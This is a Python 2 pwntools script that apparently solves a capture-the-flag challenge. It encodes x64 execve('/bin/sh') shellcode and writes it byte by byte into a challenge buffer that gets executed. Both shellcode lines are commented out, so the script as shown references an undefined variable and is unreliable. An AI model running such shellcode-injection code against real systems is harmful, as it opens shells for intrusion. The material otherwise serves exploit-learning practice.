from pwn import *
import ast

base_string = "SUGAR"

# spawn shell linux x64
#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xC0\xb0\x3b\x0f\x05"

# test with returns
#shellcode = "\xc3\xc3"


#the challenge let us write byte by byte in a buffer which is call at 0x400ed7 as code, so the idea is to write shellcode byte by byte
# the write is done with the following, a nonce multiplied by 4919 is printed, this nonce is added to the sum of the int value of each char
# supplied as input and put in truncated in a byte which is written a 0x7ffff7ff4000, each write increments the index by one


base_val = 0
min_val = 65
max_val = 90

def add_bytes(string):
    cpt = 0
    for c in string:
        cpt += ord(c)
    return cpt + base_val

# pad the string so that the write will write the byte sh
def pad_string(string, sh):
    while (ord(sh) - add_bytes(string)) % 256 < min_val or (ord(sh) - add_bytes(string)) % 256 > max_val :
        #print "string is " + string + " addbytes val is " + str(add_bytes(string)) + " mod256 " + str(add_bytes(string) % 256)
        string += "Z"
    #print "string is " + string + " addbytes val is " + str(add_bytes(string)) + " mod256 " + str(add_bytes(string) % 256)
    string += chr((ord(sh) - add_bytes(string)) % 256)
    return string


HOST='127.0.0.1'
PORT=4444
s = remote(HOST,PORT)

intro = s.recvuntil('up to ')
print intro

rand = s.recvuntil(' ')
print "got value " + rand

base_val = int(rand) / 4919
print "base val is " + str(base_val)
bytes_sum = add_bytes(base_string) + base_val
#base_string += chr((2**8) - (bytes_sum % (2**8)))

print "base string is " + base_string

print s.recvuntil("ingredient> ")

#upload shellcode
for sh in shellcode:
    #print sh
    print "sending " + pad_string(base_string, sh)
    s.send(pad_string(base_string, sh) + "\n")
    print s.recvuntil("ingredient> ")

#print "sending BAKE"

s.send("BAKE" + "\n")
print s.recvuntil("tym3")
